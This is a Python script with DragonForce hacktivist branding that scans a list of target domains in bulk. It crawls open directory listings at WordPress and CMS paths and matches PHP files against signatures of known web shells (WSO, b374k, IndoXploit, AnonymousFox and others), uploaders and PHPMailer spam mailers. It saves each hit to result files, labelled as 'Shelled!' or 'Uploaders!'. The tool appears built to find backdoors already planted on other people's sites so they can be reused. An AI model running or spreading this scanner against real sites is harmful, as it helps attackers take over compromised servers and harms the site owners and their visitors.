# Author: Pari Malam
# -*- coding: utf-8 -*-

import sys, os, requests, re, urllib3
from sys import stdout
from multiprocessing.dummy import Pool
from colorama import Fore, init
init(autoreset=True)
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fr  =   Fore.RED
fc  =   Fore.CYAN
fy  =   Fore.YELLOW
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA

if not os.path.exists('Results'):
    os.mkdir('Results')

os.system('clear' if os.name == 'posix' else 'cls')

headers = {'Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}

def banners():
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   TELEGRAM.ME/DRAGONFORCEIO                     "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(Fore.YELLOW + "[Shell-Scanner] - " + Fore.GREEN + "Perform With Shell, Uploader & Mailer Scanner")
banners()


filename = raw_input("\n" + Fore.RED + "[+] " + Fore.YELLOW + "IPs/Domain List: " + Fore.WHITE)

try:
    target = [i.strip() for i in open(filename, mode='r').readlines()]
except FileNotFoundError:
    exit('[!] File not found: ' + filename)


BaDList = ['attachment[]','Leaf PHPMailer']

Signs = ['aDriv4','File manager','Html404','xichang1','IndoXploit','Mini Shell','WSO 5.0.0','WSOX ENC','Ninja Shell','WSO 2.5','WSO 2.6','Vuln!! patch it Now!','AnonymousFox','Tryag','MisterSpyv7up','WebShellOrb','Jijle3','b374k','0byt3m1n1','FoxWSO','FilesMAn','Change Permissions','ABC Manager','type="file"/><input type="submit"','type="file"',"type='file'",'<input type="submit" value="ddok"/>','value="goodit"/>','input type="file"','-rw-r--r--',
'TheAlmightyZeus',"Jijle3",'Tryag File Manager','ubhteam','#p@@#','WSO 4.2.5','CHips L Pro sangad','MARIJuANA','indoxploit','Vuln!! patch it Now!','Mister Spy','ALFA TEaM Shell - v4.1-Tesla','B Ge Team File Manager','xichang1','Mini Shell By Black_Shadow','Mini Shell','WSO 2.5','WHY MINI SHELL','IndoXploit','ALFA TEaM Shell - v3.0.2',"anonymousfox","AnonymousFox","FoxWSO v1.2",'FilesMan',
'type="file"/><input type="submit"','value="goodit"/>','<input type="submit" value="ddok"/>']

Strings_Shells = ['aDriv4','File manager','Html404','xichang1','IndoXploit','Mini Shell','WSO 5.0.0','WSOX ENC','Ninja Shell','WSO 2.5','WSO 2.6','Vuln!! patch it Now!','AnonymousFox','Tryag','MisterSpyv7up','WebShellOrb','Jijle3','b374k','0byt3m1n1','FoxWSO','FilesMAn','Change Permissions','ABC Manager','-rw-r--r--','TheAlmightyZeus',"Jijle3",'Tryag File Manager','ubhteam','WSO 4.2.5','CHips L Pro sangad','MARIJuANA','indoxploit','Vuln!! patch it Now!','Mister Spy','ALFA TEaM Shell - v4.1-Tesla','B Ge Team File Manager','xichang1','Mini Shell By Black_Shadow','Mini Shell','WSO 2.5','WHY MINI SHELL','IndoXploit','ALFA TEaM Shell - v3.0.2',"anonymousfox","AnonymousFox","FoxWSO v1.2",'FilesMan']
Strings_PassShells = ['<input type=password name=pass',"<input name='postpass' type='password'","<input name=postpass type=password",
"input type=password name=pass><input type=submit value='>>'>",'<pre align=center><form method=post>Password<br><input type=password name=pass','>Password<br><input','input type="submit" value=">>"',"<input type=submit name='watching'"]
Strings_Uploads = ['<input type="submit" value="upload" />  </form>','<input type="file" size="20" name="uploads" />','<form method="post" target="_self" enctype="multipart/form-data">','<input name="_upl" type="submit" id="_upl" value="Upload"></form>','<input type="file" name="file" size="50">','<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">','type="file"/><input type="submit"','type="file"',"type='file'",'<input type="submit" value="ddok"/>','value="goodit"/>','input type="file"']
Strings_PHPMailer = ['<title>Leaf PHPMailer</title>','for="senderEmail"','name="subject"','Email List','Send Message']

Locations = ['/wp-content/uploads/','/wp-includes/','/wp-content/','/wp-content/plugins/','/wp-content/themes/','/wp-admin/','/.well-known/','/ALFA_DATA/','/.well-known/pki-validation/','/.well-known/acme-challenge/','/uploads/','/upload/','/admin/uploads/','/Admin/uploads/','/admin/','/images/','/assets/','/vendor/phpunit/phpunit/src/Util/PHP/','/upload/image/','/home/','/files/','/admin/editor/','/include/','/admin/images/slider/','/sites/default/files/','/admin/controller/extension/extension/','/modules/mod_simplefileuploadv1.3/elements/','/modules/','/components/','/admin/uploads/images/','/site/wp-includes/','/cgi-bin/','/wordpress/wp-includes/','/css/']

Dirctor_Defults = ['/up/']





TrustedFiles = ['admin-filters','admin','ajax-actions','PHPMailer','SMTP','translations','mo','bookmark','getid3.lib','getid3','module.audio-video.asf','module.audio-video.flv','module.audio-video.matroska','module.audio-video.quicktime','module.audio-video.riff','module.audio.ac3','module.audio.dts','module.audio.flac','module.audio.mp3','module.audio.ogg','module.tag.apetag','module.tag.id3v1','module.tag.id3v2','module.tag.lyrics3','script-loader-packages','class-IXR-base64','class-IXR-client','class-IXR-clientmulticall','class-IXR-date','class-IXR-error','class-IXR-introspectionserver','class-IXR-message','class-IXR-request','class-IXR-server','class-IXR-value','heading-paragraph','large-header-button','large-header','quote','text-three-columns-buttons','text-two-columns-with-images','text-two-columns','three-buttons','two-buttons','two-images','align','colors','custom-classname','generated-classname','typography','archives','block','calendar','categories','index','latest-comments','latest-posts','rss','search','shortcode','social-link','tag-cloud','entry','mo','plural-forms','po','streams','translations','Dentry','mo','plural-forms','po','streams','translations','byte_safe_strings','cast_to_int','error_polyfill','random','random_bytes_com_dotnet','random_bytes_dev_urandom','random_bytes_libsodium','random_bytes_libsodium_legacy','random_bytes_mcrypt','random_int','Auth','Cookie','Exception','Hooker','Hooks','IDNAEncoder','IPv6','IRI','Proxy','Response','Session','SSL','Transport','class-wp-rest-request','class-wp-rest-response','class-wp-rest-server','Author','Cache','Caption','Category','Copyright','Core','Credit','Enclosure','Exception','File','gzdecode','IRI','Item','Locator','Misc','Parser','Rating','Registry','Restriction','Sanitize','Source','class-wp-sitemaps-index','class-wp-sitemaps-provider','class-wp-sitemaps-registry','class-wp-sitemaps-renderer','class-wp-sitemaps-stylesheet','class-wp-sitemaps','class-wp-sitemaps-posts','class-wp-sitemaps-taxonomies','class-wp-sitemaps-users','autoload','autoload','inline','Diff','Renderer','native','string','xdiff','comments','embed-404','embed-content','embed','footer-embed','footer','header-embed','header','sidebar','class-wp-nav-menu-widget','class-wp-widget-archives','class-wp-widget-calendar','class-wp-widget-categories','class-wp-widget-custom-html','class-wp-widget-links','class-wp-widget-media-audio','class-wp-widget-media-gallery','class-wp-widget-media-image','class-wp-widget-media-video','class-wp-widget-media','class-wp-widget-meta','class-wp-widget-pages','class-wp-widget-recent-comments','class-wp-widget-recent-posts','class-wp-widget-rss','class-wp-widget-search','class-wp-widget-tag-cloud','class-wp-widget-text','class-automatic-upgrader-skin','class-bulk-plugin-upgrader-skin','class-bulk-theme-upgrader-skin','class-bulk-upgrader-skin','class-core-upgrader','class-custom-background','class-custom-image-header','class-file-upload-upgrader','class-ftp-pure','class-ftp-sockets','class-ftp','class-language-pack-upgrader-skin','class-language-pack-upgrader','class-pclzip','class-plugin-installer-skin','class-plugin-upgrader-skin','class-plugin-upgrader','class-theme-installer-skin','class-theme-upgrader-skin','class-theme-upgrader','class-walker-category-checklist','class-walker-nav-menu-checklist','class-walker-nav-menu-edit','class-wp-ajax-upgrader-skin','class-wp-application-passwords-list-table','class-wp-automatic-updater','class-wp-comments-list-table','class-wp-community-events','class-wp-debug-data','class-wp-filesystem-base','class-wp-filesystem-direct','class-wp-filesystem-ftpext','class-wp-filesystem-ftpsockets','class-wp-filesystem-ssh2','class-wp-importer','class-wp-internal-pointers','class-wp-links-list-table','class-wp-list-table-compat','class-wp-list-table','class-wp-media-list-table','class-wp-ms-sites-list-table','class-wp-ms-themes-list-table','class-wp-ms-users-list-table','class-wp-plugin-install-list-table','class-wp-plugins-list-table','class-wp-post-comments-list-table','class-wp-posts-list-table','class-wp-privacy-data-export-requests-list-table','class-wp-privacy-data-removal-requests-list-table','class-wp-privacy-policy-content','class-wp-privacy-requests-table','class-wp-screen','class-wp-site-health-auto-updates','class-wp-site-health','class-wp-site-icon','class-wp-terms-list-table','class-wp-theme-install-list-table','class-wp-themes-list-table','class-wp-upgrader-skin','class-wp-upgrader-skins','class-wp-upgrader','class-wp-users-list-table','comment','continents-cities','credits','dashboard','deprecated','edit-tag-messages','export','file','image-edit','image','import','list-table','media','menu','meta-boxes','misc','ms-admin-filters','ms-deprecated','ms','nav-menu','network','noop','options','plugin-install','plugin','post','privacy-tools','revision','schema','screen','taxonomy','template','theme-install','theme','translation-install','update-core','update','upgrade','user','widgets','admin-bar', 'atomlib', 'class-wp-application-passwords','repair','class-wp-block-supports','class-wp-terms', 'class-wp-block-supports', 'author-template', 'block-patterns', 'blocks', 'bookmark-template', 'bookmark', 'cache-compat', 'cache', 'canonical', 'capabilities', 'category-template', 'category', 'class-IXR', 'class-feed', 'class-http', 'class-json', 'class-oembed', 'class-phpass', 'class-phpmailer', 'class-pop3', 'class-requests', 'class-simplepie', 'class-smtp', 'class-snoopy', 'class-walker-category-dropdown', 'class-walker-category', 'class-walker-comment', 'class-walker-nav-menu', 'class-walker-page-dropdown', 'class-walker-page', 'class-wp-admin-bar', 'class-wp-ajax-response', 'class-wp-block-list', 'class-wp-block-parser', 'class-wp-block-pattern-categories-registry', 'class-wp-block-patterns-registry', 'class-wp-block-styles-registry', 'class-wp-block-type-registry', 'class-wp-block-type', 'class-wp-block', 'class-wp-comment-query', 'class-wp-comment', 'class-wp-customize-control', 'class-wp-customize-manager', 'class-wp-customize-nav-menus', 'class-wp-customize-panel', 'class-wp-customize-section', 'class-wp-customize-setting', 'class-wp-customize-widgets', 'class-wp-date-query', 'class-wp-dependency', 'class-wp-editor', 'class-wp-embed', 'class-wp-error', 'class-wp-fatal-error-handler', 'class-wp-feed-cache-transient', 'class-wp-feed-cache', 'class-wp-hook', 'class-wp-http-cookie', 'class-wp-http-curl', 'class-wp-http-encoding', 'class-wp-http-ixr-client', 'class-wp-http-proxy', 'class-wp-http-requests-hooks', 'class-wp-http-requests-response', 'class-wp-http-response', 'class-wp-http-streams', 'class-wp-image-editor-gd', 'class-wp-image-editor-imagick', 'class-wp-image-editor', 'class-wp-list-util', 'class-wp-locale-switcher', 'class-wp-locale','wp-tmp' ,'wp-feed','wp-vcd', 'class-wp-matchesmapregex', 'class-wp-meta-query', 'class-wp-metadata-lazyloader', 'class-wp-network-query', 'class-wp-network', 'class-wp-object-cache', 'class-wp-oembed-controller', 'class-wp-oembed', 'class-wp-paused-extensions-storage', 'class-wp-post-type', 'class-wp-post', 'class-wp-query', 'class-wp-recovery-mode-cookie-service', 'class-wp-recovery-mode-email-service', 'class-wp-recovery-mode-key-service', 'class-wp-recovery-mode-link-service', 'class-wp-recovery-mode', 'class-wp-rewrite', 'class-wp-role', 'class-wp-roles', 'class-wp-session-tokens', 'class-wp-simplepie-file', 'class-wp-simplepie-sanitize-kses', 'class-wp-site-query', 'class-wp-site', 'class-wp-tax-query', 'class-wp-taxonomy', 'class-wp-term-query', 'class-wp-term', 'class-wp-text-diff-renderer-inline', 'class-wp-text-diff-renderer-table', 'class-wp-theme', 'class-wp-user-meta-session-tokens', 'class-wp-user-query', 'class-wp-user-request', 'class-wp-user', 'class-wp-walker', 'class-wp-widget-factory', 'class-wp-widget', 'class-wp-xmlrpc-server', 'class-wp', 'class.wp-dependencies', 'class.wp-scripts', 'class.wp-styles', 'comment-template', 'comment', 'compat', 'cron', 'date', 'default-constants', 'default-filters', 'default-widgets', 'deprecated', 'embed-template', 'embed', 'error-protection', 'feed-atom-comments', 'feed-atom', 'feed-rdf', 'feed-rss', 'feed-rss2-comments', 'feed-rss2', 'feed', 'formatting', 'functions', 'functions.wp-scripts', 'functions.wp-styles', 'general-template', 'http', 'kses', 'l10n', 'link-template', 'load', 'locale', 'media-template', 'media', 'meta', 'ms-blogs', 'ms-default-constants', 'ms-default-filters', 'ms-deprecated', 'ms-files', 'ms-functions', 'ms-load', 'ms-network', 'ms-settings', 'ms-site', 'nav-menu-template', 'nav-menu', 'option', 'pluggable-deprecated', 'pluggable', 'plugin', 'post-formats', 'post-template', 'post-thumbnail-template', 'post', 'query', 'registration-functions', 'registration', 'rest-api', 'revision', 'rewrite', 'rss-functions', 'rss', 'script-loader', 'session', 'shortcodes', 'sitemaps', 'spl-autoload-compat', 'taxonomy', 'template-loader', 'template', 'theme', 'update', 'user', 'vars', 'version', 'widgets', 'wp-db', 'wp-diff', 'https-detection', 'https-migration', 'robots-template']
def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def IndeXOf(Contents):

    if '<title>Index of' in Contents:
        return True
    else:
        return False
        
        
def Send_Request(url,Path):
    try:

        Check_Content = requests.get(url + Path, headers=headers, verify=False, allow_redirects=False, timeout=15)
        if(len(Check_Content.content) == 0):
            Content= requests.get(url + Path, headers=headers, verify=False, timeout=15)
            return Content
        else:
            Content = requests.get(url + Path, headers=headers, verify=False, allow_redirects=False, timeout=15)
            return Content
    except:
        pass

def Extract_Folders(FoldersName):

    if '.' not in FoldersName:
        return True


def Extract_Files(FileName):
    if '.' in FileName:
        if '.'  in FileName and '.php' in FileName:
            return True
        elif '.'  in FileName and '.phtml' in FileName:
            return True
        elif '.'  in FileName and '.php3' in FileName:
            return True
        elif '.'  in FileName and '.php4' in FileName:
            return True
            
        elif '.'  in FileName and '.phar' in FileName:
            return True
            
        elif '.'  in FileName and '.shtml' in FileName:
            return True
        elif '.'  in FileName and '.cgi' in FileName:
            return True
        elif '.'  in FileName and '.py' in FileName:
            return True
        elif '.'  in FileName and '.sh' in FileName:
            return True

        elif '.'  in FileName and '.alfa' in FileName:
            return True
        elif '.'  in FileName and '.pl' in FileName:
            return True

        else:
            return False
    else:
        return False
    
def Extract(Contents,Selected):
    

    if '</td><td><a href="' in Contents:
        if 'Files' in Selected or 'Folders' in Selected:
            Pathfiles = re.findall('</td><td><a href="(.*?)">',Contents)
            return Pathfiles

    elif ']"> <a href="' in Contents:
        if 'Files' in Selected or 'Folders' in Selected:
            Pathfiles = re.findall(']"> <a href="(.*?)">',Contents)
            return Pathfiles
    
    elif 'width=device-width, initial-scale=1.0' in Contents or '<tr><td data-sort=' in Contents:
        if 'Files' in Selected or 'Folders' in Selected:
            Pathfiles = re.findall('"><a href="(.*?)"><img class="',Contents)
            return Pathfiles
            


        
def Check_Backdoors(Respones,Sign):
    

    NullData = ""
    if Respones.status_code == 200:

        if Sign in Respones.content:

            php = "<?php"
            perl = "#!/usr/bin/perl"
            py = "#!/usr/bin/python"
            sh = "#!/bin/bash"
            cgi = "#!/usr/local/bin/perl"
            if php not in Respones.content and perl not in Respones.content and py not in Respones.content and sh not in Respones.content and cgi not in Respones.content: 
                return Sign
            else:
                return NullData
        else:
            return NullData 
    else:
        return NullData
        
        

def Exploiter(site,Dirctorys):
    try:
        url = "https://" + URLdomain(site)

        for Path in Dirctorys:
        
            contents = Send_Request(url,Path).content

            if(IndeXOf(contents)):
                ListDirctors = Extract(contents,'Files')
                if(ListDirctors):
                    for elements in TrustedFiles:
                        element = elements + ".php"
                        if element in ListDirctors:
                            ListDirctors.remove(element)
                
                    for dir in ListDirctors:

                        MyDir = dir

                        if(Extract_Files(MyDir)):
                            _FirstFilePhP = Path + MyDir

                            Request_Text = Send_Request(url,_FirstFilePhP)

                            if any(Sign in Check_Backdoors(Request_Text,Sign) for Sign in Signs):
                                if any(Shells in Check_Backdoors(Request_Text,Shells) for Shells in Strings_Shells):
                                    print("[Wordpress]: {} {}{} [Shelled!]").format(url,fg,_FirstFilePhP)
                                    open('Results/Shells.txt','a').write(url + _FirstFilePhP + "\n")
                                    exit()
                                elif any(ups in Check_Backdoors(Request_Text,ups) for ups in Strings_Uploads):
                                    print("[Wordpress]: {} {}{} [Uploaders!]").format(url,fg,_FirstFilePhP)
                                    open('Results/Uploaders.txt','a').write(url + _FirstFilePhP + "\n")
                                    exit()
                                
                                else:
                                    print("[Wordpress]: {} {}{} [Success!]").format(url,fg,_FirstFilePhP)
                                    open('Results/Success.txt','a').write(url + _FirstFilePhP + "\n")
                                    exit()

                            else:
                                print("[Wordpress]: {} {}{} [Not Vulnerable!]").format(url,fr,_FirstFilePhP)
                        if(Extract_Folders(MyDir)):

                            contents2 = Send_Request(url,Path +"/"+ MyDir).content
                            ListDirctors2 = Extract(contents2,'Files')
                            if(ListDirctors2):
                                for elements in TrustedFiles:
                                    element = elements + ".php"
                                    if element in ListDirctors2:
                                        ListDirctors2.remove(element)
                                for Dir2 in ListDirctors2:
                                    MyDir2 = Dir2
                                    if(Extract_Files(MyDir2)):
                                        _NextFilePhP = Path + MyDir + MyDir2
                                        Request_Text = Send_Request(url,_NextFilePhP)
                                        if any(Sign in Check_Backdoors(Request_Text,Sign) for Sign in Signs):
                                            if any(Shells in Check_Backdoors(Request_Text,Shells) for Shells in Strings_Shells):
                                                print("[Wordpress]: {} {}{} [Shelled!]").format(url,fg,_NextFilePhP)
                                                open('Results/Shells.txt','a').write(url + _NextFilePhP + "\n")
                                                exit()
                                            elif any(ups in Check_Backdoors(Request_Text,ups) for ups in Strings_Uploads):
                                                print("[Wordpress]: {} {}{} [Uploaders!]").format(url,fg,_NextFilePhP)
                                                open('Results/Uploaders.txt','a').write(url + _NextFilePhP + "\n")
                                                exit()
                                            
                                            else:
                                                print("[Wordpress]: {} {}{} [Success!]").format(url,fg,_NextFilePhP)
                                                open('Results/Success.txt','a').write(url + _NextFilePhP + "\n")
                                                exit()
                                                
                                        else:
                                            print("[Wordpress]: {} {}{} [Not Vulnerable!]").format(url,fr,_NextFilePhP)
                                            
                                            
            else:
                print("[Wordpress]: {} {}{} [Not Vulnerable!]").format(url,fr,Path)
                
    except :
        pass
		


def CmsCheckers(site):
	try:
		
		
		Exploiter(site,Locations)
	

		
	except:
		pass




mp = Pool(100)
mp.map(CmsCheckers, target)
mp.close()
mp.join()

